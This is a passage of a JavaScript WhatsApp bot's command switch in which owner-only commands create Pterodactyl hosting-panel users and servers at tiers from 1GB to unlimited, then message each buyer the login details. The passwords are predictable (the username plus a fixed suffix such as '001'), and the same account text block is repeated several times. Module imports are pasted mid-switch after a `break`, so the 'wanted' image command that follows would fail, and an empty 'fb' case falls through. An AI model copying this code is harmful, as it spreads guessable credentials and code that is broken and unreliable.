let f = await fetch(domain + "/api/client/servers/" + srv + "/power", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"signal": action
})
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`*SUCCESSFULLY ${action.toUpperCase()} THE SERVER*`)
}
break
        case "1gb": {
        if (!isCreator) return reply(`Special People Only`)

let t = text.split(',');
if (t.length < 2) return reply(`*input Format!*
Usage:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "50"
let disk = "0"
let email = username + "505@gmail.com"
akunlo = "https://telegra.ph/file/4ab7b2011eb1a63caf8e6.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`SuccessCREATE USER ID: ${user.id}`)
ctf = `*${m2}[ Hello Sir ${pushname} Ada Panel ]${m2}*

*- ⎙ Your Panel Account Data  -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE*
PLEASE KEEP IT PROPERLY
IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN

[2] *GUARANTEE ONLY 1X*
WARRANTY CLAIMS MUST SEND PROOF OF PURCHASE

[3] *DO NOT RUN SC DDOS ON PANEL*
OR OWNER WILL DELETE ACCOUNT AND SERVER WITHOUT REFERRAL 
`

let tekss1 = ctf

let msghhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'David Cyril', 
     thumbnailUrl: 'telegra.ph/file/1b1163566956582336bea.jpg', 
     sourceUrl: '',
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss1
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "David Cyril",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});

await ptz.relayMessage(u, msghhhhhhhhh.message, {
 messageId: msghhhhhhhhh.key.id
});
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "2gb": {
    if (!isCreator) return reply(`Special People Only`)

let t = text.split(',');
if (t.length < 2) return reply(`*input Format!*
Usage:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "70"
let disk = "0"
let email = username + "505@gmail.com"
akunlo = "https://telegra.ph/file/4ab7b2011eb1a63caf8e6.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`SuccessCREATE USER ID: ${user.id}`)
ctff = `*${m2}[ Hello Sir ${pushname} Ada Panel ]${m2}*

*- ⎙ Your Panel Account Data  -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE*
PLEASE KEEP IT PROPERLY
IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN

[2] *GUARANTEE ONLY 1X*
WARRANTY CLAIMS MUST SEND PROOF OF PURCHASE

[3] *DO NOT RUN SC DDOS ON PANEL*
OR OWNER WILL DELETE ACCOUNT AND SERVER WITHOUT REFERRAL 
`

let tekss2 = ctff

let msghhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'David Cyril', 
     thumbnailUrl: 'https://imgur.com/a/PD8nT5X', 
     sourceUrl: '',
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss2
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "David Cyril",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});

await ptz.relayMessage(u, msghhhhhhhhhh.message, {
 messageId: msghhhhhhhhhh.key.id
});
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "3gb": {
    if (!isCreator) return reply(`Special People Only`)

let t = text.split(',');
if (t.length < 2) return reply(`*input Format!*
Usage:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "100"
let disk = "0"
let email = username + "505@gmail.com"
akunlo = "https://telegra.ph/file/4ab7b2011eb1a63caf8e6.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`SuccessCREATE USER ID: ${user.id}`)
ctfff = `*${m2}[ Hello Sir ${pushname} Ada Panel ]${m2}*

*- ⎙ Your Panel Account Data  -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE*
PLEASE KEEP IT PROPERLY
IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN

[2] *GUARANTEE ONLY 1X*
WARRANTY CLAIMS MUST SEND PROOF OF PURCHASE

[3] *DO NOT RUN SC DDOS ON PANEL*
OR OWNER WILL DELETE ACCOUNT AND SERVER WITHOUT REFERRAL 
`

let tekss3 = ctfff

let msghhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'David Cyril', 
     thumbnailUrl: 'https://imgur.com/a/PD8nT5X', 
     sourceUrl: '',
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss3
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "David Cyril",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});

await ptz.relayMessage(u, msghhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhh.key.id
});
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}
break



const axios = require('axios');
const { downloadContentFromMessage } = require('@whiskeysockets/baileys'); 
const { TelegraPH } = require('./lib/TelegraPH'); // Assume you have this function to upload images

case 'wanted': {
    if (m.quoted && m.quoted.message && m.quoted.message.imageMessage) {
        const quoted = m.quoted;

        try {
            // Download the image from the quoted message
            const stream = await downloadContentFromMessage(quoted.message.imageMessage, 'image');
            let buffer = Buffer.from([]);
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk]);
            }

            // Upload image to Telegra.ph (or similar service) to get a URL
            const imageUrl = await TelegraPH(buffer);  // Assuming this function returns the image URL after upload

            if (!imageUrl) {
                await ptz.sendMessage(m.chat, { text: 'Failed to upload image, please try again.' }, { quoted: m });
                return;
            }

            // Make the request to the wanted poster API with the image URL
            const apiUrl = `api.maskser.me/api/maker/wanted?url=${encodeURIComponent(imageUrl)}`;
            const response = await axios.get(apiUrl);

            if (response.data && response.data.result) {
                const wantedPosterUrl = response.data.result;

                // Send the wanted poster image back to the user
                await ptz.sendMessage(m.chat, { image: { url: wantedPosterUrl }, caption: 'Here is your wanted poster!' }, { quoted: m });
            } else {
                await ptz.sendMessage(m.chat, { text: 'Failed to generate wanted poster. Please try again.' }, { quoted: m });
            }
        
        } catch (error) {
            console.error(error);
            await ptz.sendMessage(m.chat, { text: 'An error occurred while processing the image.' }, { quoted: m });
        }
    } else {
        await ptz.sendMessage(m.chat, { text: 'Please reply to an image with the .wanted command.' }, { quoted: m });
    }
    break;

} 


case "5gb": {
    if (!isCreator) return reply(`Special People Only`)

let t = text.split(',');
if (t.length < 2) return reply(`*input Format!*
Usage:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "5GB"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "150"
let disk = "0"
let email = username + "505@gmail.com"
akunlo = "telegra.ph/file/4ab7b2011eb1a63caf8e6.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`SuccessCREATE USER ID: ${user.id}`)
ctfffff = `*${m2}[ Hello Sir ${pushname} Ada Panel ]${m2}*

*- ⎙ Your Panel Account Data  -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE*
PLEASE KEEP IT PROPERLY
IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN

[2] *GUARANTEE ONLY 1X*
WARRANTY CLAIMS MUST SEND PROOF OF PURCHASE

[3] *DO NOT RUN SC DDOS ON PANEL*
OR OWNER WILL DELETE ACCOUNT AND SERVER WITHOUT REFERRAL 
`

let tekss5 = ctfffff

let msghhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'David Cyril', 
     thumbnailUrl: 'telegra.ph/file/1b1163566956582336bea.jpg', 
     sourceUrl: '',
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss5
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "David Cyril",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});

await ptz.relayMessage(u, msghhhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhhh.key.id
});
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "6gb": {
if (!isCreator) return reply(`*Special People Only`)
let t = text.split(',');
if (t.length < 2) return reply(`*input Format!*
Usage:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "175"
let disk = "6000"
let email = username + "505@gmail.com"
akunlo = "telegra.ph/file/4ab7b2011eb1a63caf8e6.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`SuccessCREATE USER ID: ${user.id}`)
ctffffff = `*${m2}[ Hello Sir ${pushname} Ada Panel ]${m2}*

*- ⎙ Your Panel Account Data  -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE*
PLEASE KEEP IT PROPERLY
IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN

[2] *GUARANTEE ONLY 1X*
WARRANTY CLAIMS MUST SEND PROOF OF PURCHASE

[3] *DO NOT RUN SC DDOS ON PANEL*
OR OWNER WILL DELETE ACCOUNT AND SERVER WITHOUT REFERRAL 
`

let tekss6 = ctffffff

let msghhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'David Cyril', 
     thumbnailUrl: 'telegra.ph/file/1b1163566956582336bea.jpg', 
     sourceUrl: '',
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss6
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "David Cyril",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});

await ptz.relayMessage(u, msghhhhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhhhh.key.id
});
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "7gb": {
if (!isCreator) return reply(`Special People Only`)
let t = text.split(',');
if (t.length < 2) return reply(`*input Format!*
Usage:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "175"
let disk = "7000"
let email = username + "505@gmail.com"
akunlo = "telegra.ph/file/4ab7b2011eb1a63caf8e6.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`SuccessCREATE USER ID: ${user.id}`)
ctfffffff = `*${m2}[ Hello Sir ${pushname} Ada Panel ]${m2}*

*- ⎙ Your Panel Account Data  -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE*
PLEASE KEEP IT PROPERLY
IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN

[2] *GUARANTEE ONLY 1X*
WARRANTY CLAIMS MUST SEND PROOF OF PURCHASE

[3] *DO NOT RUN SC DDOS ON PANEL*
OR OWNER WILL DELETE ACCOUNT AND SERVER WITHOUT REFERRAL 
`

let tekss7 = ctfffffff

let msghhhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'David Cyril', 
     thumbnailUrl: 'telegra.ph/file/1b1163566956582336bea.jpg', 
     sourceUrl: '',
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss7
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "David Cyril",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});

await ptz.relayMessage(u, msghhhhhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhhhhh.key.id
});
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break

case 'fb':
         

case "unli": {
       if (!isCreator) return reply(`Special People Only`)
let t = text.split(',');
if (t.length < 2) return reply(`*input Format!*
Usage:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "Unli"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "505@gmail.com"
akunlo = "https://telegra.ph/file/4ab7b2011eb1a63caf8e6.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`SuccessCREATE USER ID: ${user.id}`)
ctffffffff = `*${m2}[ Hello Sir ${pushname} Ada Panel ]${m2}*

*- ⎙ Your Panel Account Data  -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE*
PLEASE KEEP IT PROPERLY
IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN

[2] *GUARANTEE ONLY 1X*
WARRANTY CLAIMS MUST SEND PROOF OF PURCHASE

[3] *DO NOT RUN SC DDOS ON PANEL*
OR OWNER WILL DELETE ACCOUNT AND SERVER WITHOUT REFERRAL 
`

let tekss8 = ctffffffff

let msghhhhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'David Cyril', 
     thumbnailUrl: 'https://imgur.com/a/PD8nT5X', 
     sourceUrl: '',
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss8
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "David Cyril",
 }),
